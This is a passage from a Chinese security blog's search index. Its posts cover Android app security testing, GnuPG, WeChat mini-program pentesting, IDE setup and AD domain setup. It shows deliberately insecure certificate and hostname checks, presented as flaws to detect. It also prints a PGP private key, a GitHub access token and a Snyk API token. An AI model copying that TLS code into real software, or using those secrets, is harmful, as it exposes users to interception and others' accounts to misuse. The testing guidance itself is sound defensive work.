TrustManager[]{new X509TrustManager(){ public X509Certificate[] getAcceptedIssuers(){ return null; } public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException{ //实现逻辑为空 } public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException{ //实现逻辑为空 } }},null); }    反编译源码，查看站点域名与站点证书的域名是否匹配- 查看 HostnameVerifier() 方法中的 verify() 函数是否存在域名校验\nNetworkUtils.conn=null;\nNetworkUtils.is =null;\nNetworkUtils.os=null;\nNetowrkUtils.DO_NOT_VERIFY = new HostanmeVerifier(){\npublic boolean verify(String s, SSLSession sslSession){\nreturn 1; // 不检查站点域名和站点证书的域名\n}\n}\n  查看 sethostnameverifier() 方法是否接受任意域名\npublic static SSLSocketFactory getFixedSocketFactory(){ MySSLSocketFactory v0; try{ v0=new MySSLSocketFactory(MySSLSocketFactory.getKeystore()); //缺陷代码 ((SSLSocketFactory)v0).setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER); }catch(Throwable v1){ v1.printStackTrace(); SSLSocketFactory v0_1 = SSLSocketFactory.getSocketFactory(); } return null; }      检测结论\n若客户端不进行服务器端是否可信、不进行域名校验、接受任意域名，对APP数据包进行拦截和篡改，则造成中间人攻击的风险。\n若客户端对服务器端返回的SSL证书进行强校验，则通过测试\n  修复建议\n对SSL证书进行签名CA是否合法、证书是否自签名、主机域名是否匹配、证书是否过期等校验。\n  \nApp加固技术   第一代加固技术： 通过对源码进行\n 压缩： 检测并一处代码中无用的类、字段、方法和特性 优化： 对字节码进行优化，移除无用指令 混淆： 使用a、b、c、d等无意义字符对类、字段、方法进行重命名 预检： 在Java平台上对处理后的代码进行预检，确保加载的class文件时可执行    第二代加固技术： 对原始App的dex文件加密，并外包一层克，将App的核心代码进行隐藏\n  第三代加固技术： 对dex文件中所有的类及方法函数内容进行抽取、加密和隐藏，单独加密后存放在apk中的特定文件内\n  第四代加固技术： DVMP(dex虚拟机保护) 具有自定义虚拟机、指令集和解释器，未保护的代码在系统虚拟机中运行，保护代码在自定义虚拟机运行\n  Table of Contents  应用脱壳  安装Frida客户端    \n应用脱壳 \n安装Frida客户端   在Android上安装Frida Server\nadb shell getprop ro.build.version.release # 获取Android版本号 adb shell getprop ro.product.cpu.abi # 查看CPU架构,根据架构下载对应的frida-server-14.2.18-android-arm64.xz xz -d frida-server-14.2.18-android-arm64.xz # 解压frida-server adb push frida-server-14.2.18-android-arm64 /data/local/tmp # 传输到/data/local/tmp目录下 adb shell su chmod a+x /data/local/tmp/frida-server-14.2.18-android-arm64 adb forward tcp:27042 tcp:27042 adb forward tcp:27043 tcp:27043 ./frida-server-14.2.18-android-arm64 python dexDump.py com.test.aspiredoctor    在macOS上安装Frida Client\npip3 install frida frida-tools    Footnotes 1 替换Android系统/system/bin/appprocess文件\n2 如apk文件和dex文件\n3 可导致调用系统功能截取屏幕和录像窃取用户信息，界面劫持，对用户进行钓鱼\n4 检测客户端程序是否对已经root的android系统、模拟器和逆向框架进行检测\n5 检测客户端程序是否进行代码加密、代码混淆和代码加固，是否易被逆向并泄露程序的设计原理和运行流程\n6 检测客户程序是否对自身进行校验\n7 检测客户端程序是否可被外部程序动态调试并输出敏感信息\n8 检测客户端程序是否存在进程保护和内存保护，防止被外部程序动态注入so文件到指定进程、以及任意修改、转储内存代码行为\n","description":"","id":22,"section":"blog","tags":[""],"title":"Android软件测试基础","uri":"http://crkmythical.github.io/blog/android%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"},{"content":"编写进度\n   Table of Contents  Gnu PG基本操作  生成公/私钥 更改密钥密码 列出公/私钥 导出公/私钥 导入公/私钥 验证公钥 删除公钥/私钥 废除密钥 exchange on keyservers   应用-加解密文件  公钥方式 对称密码方法   应用-数字签名  私钥创建,公钥验证    \nGnu PG基本操作 brew install gpg\n\n生成公/私钥 gpg --gen-key gpg (GnuPG) 2.3.1; Copyright (C) 2021 Free Software Foundation, Inc. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. gpg: directory '/Users/crkmyth1cal/.gnupg' created gpg: keybox '/Users/crkmyth1cal/.gnupg/pubring.kbx' created Note: Use \u0026quot;gpg --full-generate-key\u0026quot; for a full featured key generation dialog. GnuPG needs to construct a user ID to identify your key. Real name: crkmyth1cal Email address: crkmyth1cal@protonmail.com You selected this USER-ID: \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot; Change (N)ame, (E)mail, or (O)kay/(Q)uit? O We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. gpg: /Users/crkmyth1cal/.gnupg/trustdb.gpg: trustdb created gpg: key AA72032823A2ECCA marked as ultimately trusted gpg: directory '/Users/crkmyth1cal/.gnupg/openpgp-revocs.d' created gpg: revocation certificate stored as '/Users/crkmyth1cal/.gnupg/openpgp-revocs.d/CDD514503006241E57352861AA72032823A2ECCA.rev' public and secret key created and signed. pub ed25519 2021-06-19 [SC] [expires: 2023-06-19] CDD514503006241E57352861AA72032823A2ECCA uid crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt; sub cv25519 2021-06-19 [E] [expires: 2023-06-19]  \n更改密钥密码 gpg --change-passphrase crkmyth1cal gpg (GnuPG) 2.3.1; Copyright (C) 2021 Free Software Foundation, Inc. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.  \n列出公/私钥 gpg --list-keys # or -k /Users/crkmyth1cal/.gnupg/pubring.kbx ------------------------------------- pub ed25519 2021-06-19 [SC] [expires: 2023-06-19] CDD514503006241E57352861AA72032823A2ECCA uid [ultimate] crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt; sub cv25519 2021-06-19 [E] [expires: 2023-06-19] gpg --list-secret-key # or -K /Users/crkmyth1cal/.gnupg/pubring.kbx ------------------------------------- sec ed25519 2021-06-19 [SC] [expires: 2023-06-19] CDD514503006241E57352861AA72032823A2ECCA uid [ultimate] crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt; ssb cv25519 2021-06-19 [E] [expires: 2023-06-19]  \n导出公/私钥 gpg -a -o crkmyth1cal.gpg --export crkmyth1cal@protonmail.com -----BEGIN PGP PUBLIC KEY BLOCK----- mDMEYM1ptRYJKwYBBAHaRw8BAQdAaHUGQrDArp3fZYv3MxlT6yxP9/CW5wAgdP7n Lfqz4MO0KGNya215dGgxY2FsIDxjcmtteXRoMWNhbEBwcm90b25tYWlsLmNvbT6I mgQTFgoAQhYhBM3VFFAwBiQeVzUoYapyAygjouzKBQJgzWm1AhsDBQkDwmcABQsJ CAcCAyICAQYVCgkICwIEFgIDAQIeBwIXgAAKCRCqcgMoI6LsynziAQCa+VwORih0 H2Ycnx8vaM4hwr1iyySb3Bb5o0caHdeu3QEAzBAaIX6JnVPJnIskca6b+k+iJJsW B0xG/GTwp/G5Egi4OARgzWm1EgorBgEEAZdVAQUBAQdAmrrwVy7J5GgqpA9PfB63 oTVQAKR/w6aARrqQ7VNybWYDAQgHiH4EGBYKACYWIQTN1RRQMAYkHlc1KGGqcgMo I6LsygUCYM1ptQIbDAUJA8JnAAAKCRCqcgMoI6LsyiSuAQD2PfSX8REDV34euf9D RoBg0uKhLTgQtgm2zeEcpm+0UAD/V4KzFUFrwMqHComhztuWLEWiCZdvRn1n+n4v vYFYggQ= =3qda -----END PGP PUBLIC KEY BLOCK----- gpg -ao crkmyth1cal@protonmail.com.private.key --export-secret-keys crkmyth1cal@protonmail.com -----BEGIN PGP PRIVATE KEY BLOCK----- lIYEYM1ptRYJKwYBBAHaRw8BAQdAaHUGQrDArp3fZYv3MxlT6yxP9/CW5wAgdP7n Lfqz4MP+BwMClpMTsR0QrB7z+mUYYoXKHAVO6Sx8Qou3jDkh+13GjO8T0BKtvJxp 4gg+ycTou2JKSF79LJPTVJKMxO+qVL9ZoXNKPMroumiraVtFKp2OOrQoY3JrbXl0 aDFjYWwgPGNya215dGgxY2FsQHByb3Rvbm1haWwuY29tPoiaBBMWCgBCFiEEzdUU UDAGJB5XNShhqnIDKCOi7MoFAmDNabUCGwMFCQPCZwAFCwkIBwIDIgIBBhUKCQgL AgQWAgMBAh4HAheAAAoJEKpyAygjouzKfOIBAJr5XA5GKHQfZhyfHy9oziHCvWLL JJvcFvmjRxod167dAQDMEBohfomdU8mciyRxrpv6T6IkmxYHTEb8ZPCn8bkSCJyL BGDNabUSCisGAQQBl1UBBQEBB0CauvBXLsnkaCqkD098HrehNVAApH/DpoBGupDt U3JtZgMBCAf+BwMC3RGXbNzVlWDz4USVVz26VGm7Wo8VSovee7SFJ2YXwFbx0//u 5luXDYhKK7iTrtjDQqMXk1LOnOdO1HM5nn0uD5N5eTgRKfiDBLZRYRXxaIh+BBgW CgAmFiEEzdUUUDAGJB5XNShhqnIDKCOi7MoFAmDNabUCGwwFCQPCZwAACgkQqnID KCOi7MokrgEA9j30l/ERA1d+Hrn/Q0aAYNLioS04ELYJts3hHKZvtFAA/1eCsxVB a8DKhwqJoc7blixFogmXb0Z9Z/p+L72BWIIE =hdmV -----END PGP PRIVATE KEY BLOCK-----  \n导入公/私钥 gpg --import crkmyth1cal.gpg gpg --import crkmyth1cal.private.key gpg: key AA72032823A2ECCA: \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot; not changed gpg: key AA72032823A2ECCA: secret key imported gpg: Total number processed: 1 gpg: unchanged: 1 gpg: secret keys read: 1 gpg: secret keys unchanged: 1  \n验证公钥 gpg --edit-key crkmyth1cal gpg (GnuPG) 2.3.1; Copyright (C) 2021 Free Software Foundation, Inc. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Secret key is available. sec ed25519/AA72032823A2ECCA created: 2021-06-19 expires: 2023-06-19 usage: SC trust: ultimate validity: ultimate ssb cv25519/603F4ACEF55D04B2 created: 2021-06-19 expires: 2023-06-19 usage: E [ultimate] (1). crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt; gpg\u0026gt; fpr # fingerprint pub ed25519/AA72032823A2ECCA 2021-06-19 crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt; Primary key fingerprint: CDD5 1450 3006 241E 5735 2861 AA72 0328 23A2 ECCA gpg\u0026gt; sign \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot; was already signed by key AA72032823A2ECCA Nothing to sign with key AA72032823A2ECCA gpg\u0026gt; quit  \n删除公钥/私钥 gpg --delete-key crkmyth1cal@protonmail.com gpg --delete-secret-key crkmyth1cal@protonmail.com  \n废除密钥 gpg --output revoke.asc --gen-revoke crkmyth1cal@protonmail.com 130 ↵ sec ed25519/AA72032823A2ECCA 2021-06-19 crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt; Create a revocation certificate for this key? (y/N) y Please select the reason for the revocation: 0 = No reason specified 1 = Key has been compromised 2 = Key is superseded 3 = Key is no longer used Q = Cancel (Probably you want to select 1 here) Your decision? 3 Enter an optional description; end it with an empty line: \u0026gt; I'm not used this key \u0026gt; Reason for revocation: Key is no longer used I'm not used this key Is this okay? (y/N) y ASCII armored output forced. Revocation certificate created. Please move it to a medium which you can hide away; if Mallory gets access to this certificate he can use it to make your key unusable. It is smart to print this certificate and store it away, just in case your media become unreadable. But have some caution: The print system of your machine might store the data and make it available to others! gpg --import revoke.asc gpg --send-keys crkmyth1cal@protonmail.com  \nexchange on keyservers gpg --refresh-keys # update all keys from a keyserver gpg: refreshing 1 key from hkps://hkps.pool.sks-keyservers.net gpg: key 32B25331509A6D85: \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot; not changed gpg: Total number processed: 1 gpg: unchanged: 1 # 发送key ID到keyserver gpg --send-keys 9001430FA52D253633CB1B8D32B25331509A6D85 2 ↵ gpg: sending key 32B25331509A6D85 to hkps://hkps.pool.sks-keyservers.net gpg --search-keys ethan hunter # search key and import gpg: data source: https://hkps.pool.sks-keyservers.net:443 (1)\tEthan Hunter \u0026lt;Ethanhunter@cock.li\u0026gt; 2048 bit RSA key E6F7CD04BD975343, created: 2018-05-12, expires: 2020-05-12 (expired) Keys 1-1 of 1 for \u0026quot;ethan hunter\u0026quot;. Enter number(s), N)ext, or Q)uit \u0026gt; 1 gpg: key E6F7CD04BD975343: public key \u0026quot;Ethan Hunter \u0026lt;Ethanhunter@cock.li\u0026gt;\u0026quot; imported gpg: Total number processed: 1 gpg: imported: 1 # import keys from a keyserver gpg --receive-keys B9c0165f gpg: key C7BA956CB9C0165F: public key \u0026quot;ethan \u0026lt;askding@bugbank.cn\u0026gt;\u0026quot; imported gpg: Total number processed: 1 gpg: imported: 1  \n应用-加解密文件 \n公钥方式 # encrypt gpg -ao msg.txt.gpg -r crkmyth1cal -e msg.txt # -r = --recipient ,many recipient use : -r askDing -r crkmyth1cal -----BEGIN PGP MESSAGE----- hF4DYD9KzvVdBLISAQdAsW4ri+FuwxVn0pE1/WGl0hsmKL+j5+hWiXRohZFeXGgw 9PDAlAPE5icl3aKaOH2ZLVPaGLerGjRVZDopJqmAH812IPvlZHtZdRSPvBhb39dr 1GkBCQIV1TBYqTyxBsdFBrkOmc9dVS2/720cTcwoEISGa6RRAvzj1wIFDaP9yW0g iA9TybkoHWaM0Gfa2Zb9d3I2FGfV+wnusWr1zl8HUGxQ+HwxaJi0PvRM1T1LZHla +qOU2zzdLNNlXP0= =E0w0 -----END PGP MESSAGE----- # decrypt gpg -o msg.txt -d msg.txt.gpg gpg: encrypted with cv25519 key, ID 603F4ACEF55D04B2, created 2021-06-19 \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot;  \n对称密码方法 #encrypt gpg -ao msg.txt.symmetric.gpg -c msg.txt # -c as --symmetric -----BEGIN PGP MESSAGE----- jA0ECQMCDFhZquLMGzHz0loBJfOjQIg8gbP4LwMYHQ1dJzPmEjwPRR9WcT0OffXq Xqjk0ku3bUCXhKcx4FTmapleTSDJUBqHRNmBf94F2cbnSt+JUJZNpyPkY447wDne SYkxccKlP67k+Ro= =6Q3U -----END PGP MESSAGE----- # decrypt gpg -o msg.txt -d msg.txt.symmetric.gpg gpg: AES256.CFB encrypted data gpg: encrypted with 1 passphrase  \n应用-数字签名 \n私钥创建,公钥验证 # sign gpg -ao msg.txt.sign -s msg.txt # -s as --sign -----BEGIN PGP MESSAGE----- owGbwMvMwCVmtCnYMGBWbivjGp0k9tzidL2SipKEs02PSjIyixWAKFEhObE4VSE/ TSE1L7mosqBEIS0zJ5Wro5SFQYyLQVZMkWUCozP/Ul1VM+PT0r0w01iZQGYwcHEK wEQWf2Vk2J26+Yxx+Y4vEWt5l2w8+HDx97CNWmeVDZfnrN7XlPemvp+R4YTTtZ2H xGVayz76q6yb1eRmfiuWbW/wHB3fzS0niydJsQIA =GoIj -----END PGP MESSAGE----- # verify gpg --verify msg.txt.sign gpg: Signature made Sat Jun 19 13:38:42 2021 CST gpg: using EDDSA key 9001430FA52D253633CB1B8D32B25331509A6D85 gpg: Good signature from \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot; [ultimate] # verify and restore gpg -o msg.txt -d msg.txt.sign gpg: Signature made Sat Jun 19 13:38:42 2021 CST gpg: using EDDSA key 9001430FA52D253633CB1B8D32B25331509A6D85 gpg: Good signature from \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot; [ultimate]  ","description":"","id":23,"section":"blog","tags":null,"title":"GnuPG使用教程","uri":"http://crkmythical.github.io/blog/gnupg%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"},{"content":"编写进度\n   Table of Contents  安装Burp证书系统级证书 (\u0026gt;=Android 7.0，需Root) 微信小程序渗透测试流程  获取微信小程序 下载反编译工具 wxappUnpacker 并反编译小程序 代码审计，找出所有API进行测试    \n安装Burp证书系统级证书 (\u0026gt;=Android 7.0，需Root) 因Android 7以后，系统不再信任用户级的证书，只能信任系统级的证书，所以需要将burp证书安装到Android系统目录下\n  获取Burp证书\n  方法一:\nBurp开启代理后，浏览器访问http://burp 证书 cacert.der\n  方法二:\n    证书转换\nopenssl x509 -inform DER -in cacert.der -out cacert.pem # 证书格式转换 der --\u0026gt; pem openssl version # 查看openssl版本 openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1\t# 打印证书hash值 9a5ba575 openssl版本在1.0以上执行 openssl x509 -inform PEM -subject_hash -in cacert.pem\t| head -1 # 打印证书hash值 openssl版本在1.0以下执行 mv cacert.pem \u0026lt;hash\u0026gt;.0 # 将pem格式的证书重命名为 hash值.0    将证书 9a5ba575.0 移动到系统证书目录 /system/etc/security/cacerts\nadb push 9a5ba575.0 /sdcard/ # 推送到sdcard目录上 adb shell su mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/ # 将证书移到此目录 chmod 644 /system/etc/security/cacerts/9a5ba575.0 # 设置权限 adb reboot # 重启生效    \n微信小程序渗透测试流程 \n获取微信小程序 Android 手机最近使用过的微信小程序所对应的 wxapkg 包文件都存储在特定文件夹下\n~ /data/data/com.tencent.mm/MicroMsg/{User}/appbrand/pkg/~\n{User} 为当前用户的用户名 315e07770f778822*********2bfee\nadb shell su rm /data/data/com.tencent.mm/MicroMsg/{User} # 先删除此目录,手机上点开待测的小程序后会重新生成此目录 原因：防止包含其他小程序 cp -R /data/data/com.tencent.mm/MicroMsg/{User}/appbrand/pkg /sdcard # 将小程序目录复制到/sdcard上 adb pull /sdcard/pkg ./ # 将小程序拷贝到本地当前目录  \n下载反编译工具 wxappUnpacker 并反编译小程序   下载反编译工具\ngit clone git@github.com:askDing/wxappUnpacker.git cd wxappUnpacker ./install.sh -npm # 安装npm和node ./install.sh # 安装依赖    解包操作\n./de_miniapp.sh -d path/to/xxx.wxapkg # 解某个小程序 ./de_miniapp.sh /path/to/pkg # 解pkg目录下所有的小程序  微信小程序项目目录结构介绍\n├── app.js 注册小程序，绑定生命周期回调函数、错误监听和页面不存在监听函数等 ├── app.json 小程序全局配置，决定页面文件的路径、窗口表现、设置网络超时时间、设置多tab等 ├── app.wxss 小程序公共样式表 ├── pages 存放小程序各个页面信息 │ │── index │ │ ├── index.wxml 必须 页面构造类似html文件 │ │ ├── index.js 必须 对页面进行注册，指定页面的初始数据、生命周期回调、事件处理函数等 │ │ ├── index.json 页面窗口配置 │ │ └── index.wxss 页面样式表相当css文件 │ └── logs │ ├── logs.wxml │ └── logs.js └── utils 放置一些公用的方法 │ └── sitemap.json 配置小程序及其页面是否允许被微信索引 │ └── project.config.json 小程序项目配置文件 ------------------------------------------------------- ├─cloud-functions ---云函数 │ └─setCrypto ---数据加密模块，用户加密一些数据 │ index.js │ package.json │ ... │ ... │ ├─components ---小程序自定义组件 │ ├─plugins --- （重点）可独立运行的大型模块，可以打包成plugins │ │ ├─comment ---评论模块 │ │ │ │ index.js │ │ │ │ index.json │ │ │ │ index.wxml │ │ │ │ index.wxss │ │ │ │ services.js ---（重点）用来处理和清洗数据的service.js，配套模板和插件 │ │ │ │ │ │ │ └─submit ---评论模块子模块：提交评论 │ │ │ index.js │ │ │ index.json │ │ │ index.wxml │ │ │ index.wxss │ │ │ │ │ └─canvasPoster ---canvas海报生成模块 │ │ index.js │ │ index.json │ │ index.wxml │ │ index.wxss │ │ services.js ---（重点）用来处理和清洗数据的service.js，配套模板和插件 │ │ │ └─templates ---（重点）模板，通过外部传参的容器，不做过多的数据处理 │ │ │ ├─slideshow ---滚屏切换模板 │ │ index.js │ │ index.json │ │ index.wxml │ │ index.wxss │ │ service.js ---（重点）用来处理和清洗数据的service.js，配套模板和插件 │ │ │ └─works ---作品模板 │ │ index.js │ │ index.json │ │ index.wxml │ │ index.wxss │ │ service.js │ │ │ ├─articlePlugin ---作品模板中的文章类型 │ │ index.js │ │ index.json │ │ index.wxml │ │ index.wxss │ │ │ ├─galleryPlugin ---作品模板中的九宫格类型 │ │ index.js │ │ index.json │ │ index.wxml │ │ index.wxss      \n代码审计，找出所有API进行测试   查看 xxx.json 文件匹配URI(html页面）\n{ \u0026quot;subPackages\u0026quot;: [ { \u0026quot;root\u0026quot;: \u0026quot;pages/pageNews/\u0026quot;, \u0026quot;pages\u0026quot;: [ \u0026quot;pages/pageNews/news/notice/index\u0026quot;, \u0026quot;pages/pageNews/news/details\u0026quot;, ] }, { \u0026quot;root\u0026quot;: \u0026quot;pages/pageRetail/\u0026quot;, \u0026quot;pages\u0026quot;: [ \u0026quot;pages/pageRetail/companys/company/company\u0026quot;, \u0026quot;pages/pageRetail/companys/companyAdd/companyAdd\u0026quot;, \u0026quot;pages/pageRetail/lsms/fghxq\u0026quot; ] }, ] }    查看 xxx.js 文件，搜索 module.exports,找出域名和API接口,进行测试\n(function (module, exports, __webpack_require__) { \u0026quot;use strict\u0026quot;; var httpUrl = { //本地环境 //baseUrl:'http://127.0.0.1:8001/app_name/', //baseysts:'http://127.0.0.1:8004/' //开发环境 //baseUrl:'http://192.168.1.199:8001/app_name/', //baseysts:'http://192.168.1.199:8004/' //安评环境 //baseUrl:'http://10.150.86.125:8001/app_name/', //baseysts:'http://10.150.86.125:8004/' //正式环境 baseUrl: 'https://xx.xx.xx.xx/app_name/' }; module.exports = httpUrl; /***/ }) (function (module, exports, __webpack_require__) { \u0026quot;use strict\u0026quot;; //const base = \u0026quot;http://192.168.1.199:7120/\u0026quot; var bases = __webpack_require__(/*! ./https */ \u0026quot;./src/config/https.js\u0026quot;); var base = bases.baseUrl; var baseyst = bases.baseysts; module.exports = { newsLists: base + 'appnews/news/list', //资讯列表 newsDetails: base + 'appnews/news/detail', tbsbqr: base + 'appsbs/refund/tbsbqr', queren: base + 'appsbs/refund/queren', .... gang_dong_geo: base + 'appbase/static/js/gang_dong_geo.json' //地图json }; })    References:\n 小程序开发官方文档 微信小程序开发指南  ","description":"","id":24,"section":"blog","tags":[""],"title":"App渗透测试","uri":"http://crkmythical.github.io/blog/app%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"content":"编写进度\n   IntelJ Idea 教程 https://github.com/judasn/IntelliJ-IDEA-Tutorial\n1  brew install --cask intellij-idea   激活 Settings Import/Export  导出配置   IDEA 偏好设置 全局配置打开偏好设置\nAppearance \u0026amp; Behavior System Settings Keymap 常用快捷键    Ctrl+h 查看当前类的层次结构      Command+7 查看类结构    Command+O 快速搜索类    Command +F 关键字检索(当前文件) 全局 Command+Shift+F   Command+Alt +B 查看方法/类的实现类    Alt + F7 查看调用链(方法被调用的情况) Find Usages   Command+E 查看最近使用的文件    Shift+ Alt+Command+U 查看可视化类继承链    Command+/ 行注释 Shift+Command+/ 块注释   /** 方法/类注释 可自定义类模板    可视化类继承链\nEditor Editor-\u0026gt;General   自动导入\n  Appearnace\n  Code Completion  Editor Tabs  Postfix Completion var声明 null判空 notnull判非空 nn判非空 for遍历 fori带索引的遍历 not取反 if条件判断 cast强转 return返回值 Editro-\u0026gt;Code Editing Font Color Scheme Code Style Inspections File and Code Templates  File Header    Class\n  Interface\n  Enum\n  File Encodings BOM（byte-order mark），即字节顺序标记，它是插入到以UTF-8、UTF16或UTF-32编码Unicode文件开s头的特殊标记，用来识别Unicode文件的编码类型。对于UTF-8来说，BOM并不是必须的，因为BOM用来标记多字节编码文件的编码类型和字节顺序（big-endian或little-endian）。\n　不含BOM的UTF-8才是标准形式，UTF-8不需要BOM\n带BOM的UTF-8文件的开头会有U+FEFF，所以我新建的空文件会有3字节的大小。\nLive Templates File Types 隐藏项目中 .idea目录\nInlay Hints -Java Copyright Plugins 常用插件 Theme - Nord / One Dark / Xcode-Dark Dash Edutool Stackoverflow 时序图-SequenceDigram 项目代码统计 Statistic 快捷键展示Presentation Assistant 阿里巴巴 Java 代码规范- Alibaba Java Code Guidelines MybatisX 高效操作Mybatis插件 Mybatis-log-plugin Codota— 代码智能提示 必备的翻译插件-Translation GitToolBox-显示代码提交时间 Key Promoter X 快捷键提示插件 Rainbow Brackets ——让你的括号变成不一样的颜色，防止错乱括号 Leetcode Editor 可以在IDEA中在线刷题。 Java Stream Debugger —— Stream 将操作步骤可视化 Insomnia-防止休眠 安全插件 SpotBugs https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial\nBlack Duck SCA WhiteSource Advise Momo Code Sec Inspector Java Decompiler(JD-GUI) Jadx Android Decompiler Snyk CMD模式 1 2  brew tap snyk/tap \u0026amp;\u0026amp; brew install snyk snyk config set api c70b7d5a-1a74-44df-b52c-3ab5c80d12e6   IDE模式 先配置JAVA_HOME\n1 2 3 4 5 6  echo \u0026#39; ## JDK export JAVA_HOME=/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home export PATH=$JAVA_HOME/bin:$PATH \u0026#39; \u0026gt;\u0026gt; ~/.zshrc   jclasslib bytecode viewer 查看字节码 Jadx Android Decompiler RIPS Security Analysis RestfulTool—— 快捷跳转Action方法  snyk SonarLint 代码质量检查插件 Version Control 与Gitlab集成 Build, Excution,Deployment Maven Compiler Debug 当调用ConcurrentLinkedQueue类的toString()方法时会获取队列的迭代器，而创建迭代器时会调用队列的first()方法，在first()方法里会修改head的属性，从而导致输出的结果不一致\n在远程调试时，我们发现有些类的断点一直断不上问题，该问题可能出在 IntelliJ 的 Settings -\u0026gt; Debugger -\u0026gt; Stepping 配置上。若勾选了 Do not step into the classes，则会让这些断点失效:\n本地调试 远程调试 对第三方jar包进行调试   创建工程，将jar包添加到依赖库中\n  在Main函数处打断点，添加调试配置，运行程序，点击debug\n  Language \u0026amp; Frameworks Tools Setting Repository- 使用git仓库保存Idea配置文件Settings Access-Token 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\nAdvanced Settings Other Settings 代码对比效果图\n","description":"","id":25,"section":"blog","tags":null,"title":"IDEA使用教程","uri":"http://crkmythical.github.io/blog/idea%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"},{"content":"编写进度\n   Oracle JDK_8 jdk-8u291-linux-x64.tar.gz\n1 2 3 4 5 6  tar -x -C /opt/jdk -f jdk-8u66-linux-x64.tar.gz # 解压jdk到/opt/jdk目录 update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_291/bin/java 100 update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_291/bin/javac 100 update-alternatives --remove java /opt/jdk1.8.0_291/bin/java update-alternatives --remove javac /opt/jdk1.8.0_291/bin/java   ","description":"","id":26,"section":"blog","tags":null,"title":"linux上多版本JDK该如何管理","uri":"http://crkmythical.github.io/blog/linux%E4%B8%8A%E5%A4%9A%E7%89%88%E6%9C%ACjdk%E8%AF%A5%E5%A6%82%E4%BD%95%E7%AE%A1%E7%90%86/"},{"content":"编写进度\n   搭建Android程序分析环境 常见逆向分析工具  Adnroid Studio  1  brew install --cask android-studio # 安装Adnroid Studio    apktool  1  brew install apktool # 提供反编译与回编译功能    smali/baksmail  1  brew install smali # dex文件的反编译与回编译工具    dex2jar \u0026amp; jd-gui  1 2  brew install dex2jar # 将dex文件转成jar包 brew install --cask jd-gui # 查看jar包源码    jadx  1  brew install jadx # 将.dex/.jar/.class反编译成.java    010 Editor  1  brew install --cask 010-editor # 二进制编辑器     JEB\n  Androguard\n  集成工具 Android-Crack-Tool\n  Android-Killer\n  APKiD\n  编译Android源码 下载源码\n1 2  repo init -u https://android.googlesource.com/platform/manifest -b android-7.1.1_r1 repo sync --force-sync --force-broken   macOS下直接编译 需安装XCode命令行工具和macOS SDK\n1  xcode-select --install   编译Android源码\n1 2 3 4 5 6 7 8 9 10 11 12  export USE_CCACHE=1 mkdir ccache export CCACHE_DIR=ccache prebuilts //misc/darwin-x86/ccache/ccache -M 50G sudo xcode-select -s /Applications/Xcode.app/Content/Developer export JAVA_HOME=$(/usr/libexec/java_home -v 1.8) source build/envsetup.sh lunch aosp_angler-userdebug make clobber brew uninstall curl \u0026amp;\u0026amp; brew install curl --with-openssl export PATH=$(brew --prefix curl)/bin:$PATH caffeinate make -j8   在Docker中编译Android源码-推荐 1  brew install --cask docker docker-toolbox   打开Kitematic.app 搜索 aosp 选择4.4版，点击create\n下载后\n修改android源码和ccache缓存位置,\n重启\n执行 make -j4\n","description":"","id":27,"section":"blog","tags":null,"title":"Android软件安全测试软件_mac平台","uri":"http://crkmythical.github.io/blog/android%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%BD%AF%E4%BB%B6-mac%E5%B9%B3%E5%8F%B0/"},{"content":"编写进度\n   AD小型域环境搭建 参考快速搭建精简的小型域环境\n WinServer 2016 10.211.55.5 (DC) Win7 专业版 10.211.55.6 Win10 专业版 10.211.55.3  在Winserver部署 Active Directory域服务 更改本地DNS指向本机地址 1 2 3 4 5 6 7  # 设置静态ip netsh interface ip set addr \u0026#34;本地连接\u0026#34; static 192.168.0.1 255.255.255.0 192.168.0.254 1 netsh interface ip set dns \u0026#34;本地连接\u0026#34; static 202.103.24.68 netsh interface ip add dns \u0026#34;本地连接\u0026#34; 10.211.55.5 # 设置动态ip netsh interface ip set addr \u0026#34;本地连接\u0026#34; dhcp netsh interface ip set dns \u0026#34;本地连接\u0026#34; dhcp   部署Active Directory域服务 配置Active Directory域服务 ⚠️ 指定与控制功能时，不能选择 只读域控制器(RODC)\n添加域用户  zhangsan qwe@123 lisi qwe@123  验证是否安装成功\n添加域成员机 更改DNS指向域控 10.211.55.5 win7/10 